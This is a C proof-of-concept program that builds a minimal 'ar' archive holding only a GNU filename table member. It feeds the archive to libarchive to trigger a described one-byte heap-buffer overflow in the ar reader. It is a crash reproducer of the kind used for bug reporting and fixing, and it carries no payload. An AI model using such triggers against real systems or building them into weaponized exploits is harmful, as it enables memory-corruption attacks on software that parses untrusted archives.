/*
 * Proof of concept for a 1-byte heap-buffer-overflow in the "ar" reader's
 * GNU filename table handling (libarchive/archive_read_support_format_ar.c).
 *
 * ar->strtab_size ends up one byte larger than the buffer actually
 * allocated for ar->strtab, so ar_parse_gnu_filename_table() reads (and
 * then writes) one byte past the end of that heap allocation while
 * validating/terminating the table.
 *
 * Reached entirely through the public libarchive API with an in-contract
 * "ar" archive containing nothing but a minimal, well-formed GNU filename
 * table member ("//").
 */
#include <archive.h>
#include <archive_entry.h>

#include <stdio.h>
#include <string.h>

static void
put_field(unsigned char *hdr, size_t offset, size_t width, const char *value)
{
	size_t len = strlen(value);

	memset(hdr + offset, ' ', width);
	memcpy(hdr + offset, value, len < width ? len : width);
}

int
main(void)
{
	unsigned char archive_data[8 + 60 + 2];
	unsigned char *hdr = archive_data + 8;
	struct archive *a;
	struct archive_entry *ae;
	int r;

	/* Global "ar" magic. */
	memcpy(archive_data, "!<arch>\n", 8);

	/* One 60-byte member header describing the GNU filename table
	 * ("//"), followed by 2 bytes of (arbitrary) table content. */
	memset(hdr, ' ', 60);
	put_field(hdr, 0, 16, "//");            /* name */
	put_field(hdr, 16, 12, "0");             /* mtime */
	put_field(hdr, 28, 6, "0");              /* uid */
	put_field(hdr, 34, 6, "0");              /* gid */
	put_field(hdr, 40, 8, "0");              /* mode */
	put_field(hdr, 48, 10, "2");             /* size: 2 bytes of table data */
	memcpy(hdr + 58, "`\n", 2);               /* fmag */

	memcpy(hdr + 60, "a\n", 2);               /* the (2-byte) table body */

	a = archive_read_new();
	if (a == NULL) {
		fprintf(stderr, "archive_read_new failed\n");
		return 1;
	}
	if (archive_read_support_format_ar(a) != ARCHIVE_OK) {
		fprintf(stderr, "archive_read_support_format_ar failed\n");
		return 1;
	}
	if (archive_read_open_memory(a, archive_data, sizeof(archive_data))
	    != ARCHIVE_OK) {
		fprintf(stderr, "archive_read_open_memory: %s\n",
		    archive_error_string(a));
		return 1;
	}

	/* Triggers ar_parse_gnu_filename_table(), which reads and writes
	 * one byte past the heap buffer allocated for the filename table. */
	r = archive_read_next_header(a, &ae);
	printf("archive_read_next_header returned %d (%s)\n", r,
	    archive_error_string(a) ? archive_error_string(a) : "no error");

	archive_read_free(a);
	return 0;
}
